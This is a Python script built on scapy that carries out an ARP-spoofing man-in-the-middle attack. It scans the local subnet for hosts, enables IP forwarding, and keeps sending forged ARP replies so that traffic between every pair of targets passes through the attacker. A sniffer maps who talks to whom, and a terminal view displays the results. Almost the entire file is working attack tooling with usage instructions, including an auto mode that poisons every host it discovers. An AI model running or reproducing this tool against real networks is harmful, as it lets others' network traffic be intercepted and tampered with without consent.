from scapy.all import *
import socket
from multiprocessing import Process
from multiprocessing.connection import Listener, Client # we will use this to exange data easly between the different processes

localhost = "127.0.0.1"

class SmartAnalyzer:
    def __init__(self, key="secret"):
        self.capture = None
        self.workingBuffer = {"pakets": []}
        self.IPAddr = socket.gethostbyname(socket.gethostname())
        # we have to init a timer to print the table every 5 sec
        self.timer = time.time()
        self.key = key
        self.data = {}


    def start(self, interface):
        print("starting analyzer")
        self.capture = AsyncSniffer(iface=interface, prn=self.analyze)
        self.capture.start()
        print("started analyzer")
        # whe have to send the data to the drawer process every 1 sec
        while True:
            try:
                time.sleep(1)
                if len(self.data) != 0:
                    self.send_data(self.data)
                    self.data = {}
            except KeyboardInterrupt:
                break

        try:
            self.capture.join()
        except KeyboardInterrupt:
            self.capture.stop()
        print("stoped analyzer")

    def analyze(self, pkt):
        if pkt.haslayer(IP):
            self.workingBuffer["pakets"].append(pkt)
        else:
            pass

        for i in range(len(self.workingBuffer["pakets"])):
            if time.time() - self.workingBuffer["pakets"][i].time > 5:
                del self.workingBuffer["pakets"][i]
                break

        # if more than 1 source send packets in the last 5 seconds, we check if they are sending to the same destination
        # first we do a ip map in a dictionary
        ip_map = {}
        for pkt in self.workingBuffer["pakets"]:
            if pkt[IP].dst not in ip_map:
                ip_map[pkt[IP].dst] = []
            if pkt[IP].src not in ip_map[pkt[IP].dst]:
                ip_map[pkt[IP].dst].append(pkt[IP].src)

        # then we check if there is more than 1 source sending packets to the same destination
        suspicious_ips = []
        other_ips = [] # if there is at least 1 host sending packets to a dest , we add it to this list

        for ip in ip_map:
            if len(ip_map[ip]) > 1:
                suspicious_ips.append(ip)
            else:
                other_ips.append(ip)


        # we check each suspicious ip to see if it is a private ip, if it is, we print a warning message, if not we do a reverse dns lookup to see if it is a known site
        # to represent all the data in a readable way, we use a dictionary and we will draw a table with it
        data = {}
        for ip in suspicious_ips:
            if self.is_private(ip):
                data[ip] = {"type": "Private","Suspicious": True, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "none"}
            else:
                try:
                    data[ip] = {"type": "Public", "Suspicious": True, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": socket.gethostbyaddr(ip)[0]}
                except Exception:
                    data[ip] = {"type": "Public", "Suspicious": True, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "Unknown"}
        for ip in other_ips:
            if self.is_private(ip):
                data[ip] = {"type": "Private", "Suspicious": False, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "none"}
            else:
                try: # we do a reverse dns lookup to see if it is a known site using
                    data[ip] = {"type": "Public", "Suspicious": False, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": socket.gethostbyaddr(ip)[0]}
                except Exception:
                    data[ip] = {"type": "Public", "Suspicious": False, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "Unknown"}

        self.data = data

    def send_data(self, data):
        # we send the data to the drawer process using a multiprocessing connection
        # we use a key to make sure that the data is not corrupted
        while True:
            try:
                conn = Client(address=(localhost, 9658), authkey=b'secret')
                conn.send({"type": "analyzer", "data": data})
                conn.close()
                break
            except :
                time.sleep(0.1)




    def get_status(self, hostname):
        if hostname == "Unknown":
            return "Unknown"
        elif hostname == "Private IP":
            return "Private IP"
        elif hostname == self.IPAddr:
            return "Your IP"
        else:
            return "---"



    def is_private(self, ip):
        # we check if it is a private ip
        ip = ip.split(".")
        if ip[0] == "10":
            return True
        elif ip[0] == "172":
            if 16 <= int(ip[1]) <= 31:
                return True
        elif ip[0] == "192" and ip[1] == "168":
            return True
        return False




class Drawer:  # this class will be used to draw everything in the terminal in a clean way, we have to check the terminal size to draw the table correctly
    def __init__(self):
        self.width = os.get_terminal_size().columns
        self.height = os.get_terminal_size().lines
        self.data = {"analyzer": {}, "mitm": {}} # we will store the data in this dictionary
    def main_loop(self):
        listener = Listener(address=(localhost, 9658), authkey=b'secret')
        print("listening for connections")
        while True:
            conn = listener.accept()
            print("connected")
            while True:
                try:
                    while conn.poll():
                        recv = conn.recv()
                        if recv is not None:
                            try:
                                match recv["type"]:
                                    case "analyzer":
                                        print("received data from analyzer")
                                        self.data["analyzer"] = recv["data"]
                                    case "mitm":
                                        print("received data from mitm")
                                        self.data["mitm"] = recv["data"]

                                    case _:
                                        print("got unknown data")
                            except Exception:
                                print("error while parsing data")
                except EOFError:
                    break
            time.sleep(1)
            self.draw()
    def draw_interface(self):
        # we draw the interface decoration up
        os.system("clear")
        print("+" + "-" * (self.width - 2) + "+")
        # we draw the table with the data
        self.draw_table(self.data)
        # we draw the interface decoration down
        print("+" + "-" * (self.width - 2) + "+")
    def draw_table(self, data):
        # we draw the table, on the left we have the mitm data and on the right we have the analyzer data
        # we have to check if the data is not empty
        # it should look like this:
        # +------------------------------------------------------------+
        # | targets                                                  |
        # +------------------------------------------------------------+
        # | IP Address     | MAC Address     | Status                   |
        # | xxx.xxx.xxx.xxx| xx:xx:xx:xx:xx:xx| xxxxxxxxxxxxxxxxxxxxxxxx|
        # | xxx.xxx.xxx.xx | xx:xx:xx:xx:xx:xx| xxxxxxxxxxxxxxxxxxxxxxxx|
        # +------------------------------------------------------------+
        # |
        # +------------------------------------------------------------+
        # | analyzer                                                 |
        # +------------------------------------------------------------+
        # | Dest ip | | hostname |nb of requests(total)| nb of host that accessed it   |
        # +------------------------------------------------------------+
        if len(data["mitm"]) == 0 and len(data["analyzer"]) == 0:
            print("No data to display")
            return
        # we draw the targets table
        print("+" + "-" * (self.width - 2) + "+")
        # for every line drawn, we have to check the lenght of the line to draw it correctly
        # we draw the title
        title = "targets"
        print("|" + title + " " * (self.width - len(title) - 3) + "|")
        print("+" + "-" * (self.width - 2) + "+")
        # we draw the table header
        print("|" + "IP Address" + " " * (self.width //4) + "|" + "MAC Address" + " " * (self.width //4) + "|" + "Status" + " " * (self.width //4) + "|")
        print("+" + "-" * (self.width - 2) + "+")
        # we draw the table content
        for ip in data["mitm"]:
            # TypeError: list indices must be integers or slices, not str
            # to not get this error, we have to use integer to navitage in the list
            try:
                print("|" + ip[0] + " " * (self.width //4) + ip[1] + " " * (self.width //4) + " " * (self.width //4) + "|")
            except Exception:
                print("error")





    def draw(self):
        # we draw everything
        self.draw_interface()








class Netscanner:
    def __init__(self, interface):
        self.interface = interface
        self.IPAddr = socket.gethostbyname(socket.gethostname())
        print("[*] excluding host IP: " + self.IPAddr)
        print("[*] Network scanner class init")
        # get subnet mask using ip a on linux
        self.subnet = os.popen("ip a | grep " + self.interface + " | grep inet | awk '{print $2}'").read().split("/")[1][:-1]
        # get network address using subnet and host ip
        self.scanip = self.IPAddr[:self.IPAddr.rfind(".")] + ".1/" + self.subnet
        self.ips = []

    def sniffer_arp(self):
        # IP Address for the destination
        # create ARP packet
        arp = ARP(pdst=self.scanip)
        # create the Ether broadcast packet
        # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        # stack them
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0)[0]

        # a list of clients, we will fill this in the upcoming loop
        clients = []

        for sent, received in result:
            # for each response, append ip and mac address to `clients` list
            ip = received.psrc
            if ip != self.IPAddr:
                self.ips.append(received.psrc)



    def get_ips(self):
        self.sniffer_arp()
        return self.ips


class MITMAttack:

    def __init__(self, interface, target_ips):
        self.interface = interface
        self.tips = target_ips
        self.scannerP = None
        self.drawP = None
        self.targets = []


    def scanner(self):
        scanner = Netscanner(self.interface)
        while True:
            ips = scanner.get_ips()
            iplist = []
            for i in self.targets:
                iplist.append(i[0])

            for ip in ips:

                if len(iplist) == 0:
                    self.targets.append([ip, None])
                    iplist.append(ip)
                else:
                    if ip not in iplist:
                        iplist.append(ip)
                        self.targets.append([ip, self.get_mac(ip)])


            # we check if all the targets have a mac address
            for i in self.targets:
                if i[1] is None: # if not, we try to get it
                    self.targets[self.targets.index(i)][1] = self.get_mac(i[0])
                    # if we still can't get it, we remove it from the list
                    if self.targets[self.targets.index(i)][1] is None:
                        self.targets.remove(i)

            if len(self.targets) != 0:
                datalist = []
                # we have to put each ip with each mac
                self.send_data(self.targets)

            time.sleep(5)

    def send_data(self, data):
        # we send the data to the drawer process using a multiprocessing connection
        # we use a key to make sure that the data is not corrupted
        while True:
            try:
                conn = Client(address=(localhost, 9658), authkey=b'secret')
                conn.send({"type": "mitm", "data": data})
                conn.close()
                break
            except :
                time.sleep(0.1)

    def enable_ip_forwarding(self):
        print("\n[*] Enabling IP Forwarding...\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=self.interface, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def reARP(self):
        print("\n[*] Restoring Targets...")
        # we have to restaure each victim to its original state the same way we tricked them

        for i in self.targets:
            for j in self.targets:
                if i != j:
                    send(ARP(op=2, pdst=i[0], psrc=j[0], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=j[1]), count=7)
                    send(ARP(op=2, pdst=j[0], psrc=i[0], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=i[1]), count=7)

        print("\n[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        if self.scannerP is not None:
            print("[*] Stopping sniffer thread...")
            self.scannerP.kill()
        if self.drawP is not None:
            print("[*] Stopping drawer thread...")
            self.drawP.kill()

        print("[*] Shutting Down...")
        sys.exit(1)

    def trick(self):
        if len(self.targets) != 0:
            for i in self.targets:
                for j in self.targets:
                    if i != j:
                        send(ARP(op=2, pdst=i[0], psrc=j[0], hwdst=i[1]))
                        send(ARP(op=2, pdst=j[0], psrc=i[0], hwdst=j[1]))


    def mitm(self,mode):
        try:
            if self.tips is not None:
                for i in self.tips:
                    self.targets.append((i, self.get_mac(i)))
        except Exception:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[!] Couldn't Find MAC Address(es)")
            print("[!] Exiting...")
            sys.exit(1)
        if mode == "auto":
            print("[*] Starting scanner thread...")
            self.scannerP = Process(target=self.scanner)
            self.scannerP.start()

        print("[*] Starting drawer thread...")
        self.drawP = Process(target=Drawer().main_loop)
        self.drawP.start()


        timer = time.time()

        print("[*] Poisoning Targets...")
        print("[*] Use CTRL+C to stop")
        print("[*] Targets poisoned: ")
        while True:
            try:
                try :
                    self.trick()
                except Exception:
                    print("error while poisoning")
                time.sleep(1.5)

            except KeyboardInterrupt:
                self.reARP()
                break

def print_usage():
    print('Usage: python main.py -i <interface> -t "<target_ip1> <target_ip2> ..."')
def main(argv):
    smart = None

    interface = None
    target_ips = []
    for i in range(len(argv)):
        if argv[i] == "-i":
            interface = argv[i + 1]
        elif argv[i] == "-t":
            target_ips = argv[i + 1].split(" ")
        elif argv[i] == "-s":
            # smart mode
            smart = Process(target=SmartAnalyzer().start, args=(interface,))
    mode = "manual"
    if interface is None:
        print("Interface not specified")
        print_usage()
        sys.exit(1)
    elif len(target_ips) == 0:
        print("Target IPs not specified using auto mode")
        print_usage()
        mode = "auto"


    print(f"Interface: {interface}")
    print(f"Target IPs: {target_ips}")
    attack = MITMAttack(interface, target_ips)
    attack.enable_ip_forwarding()
    if smart is not None:
        smart.start()

    attack.mitm(mode)



if __name__ == "__main__":
    #attack = MITMAttack()
    #attack.enable_ip_forwarding()
    #attack.mitm()
    main(sys.argv[1:])
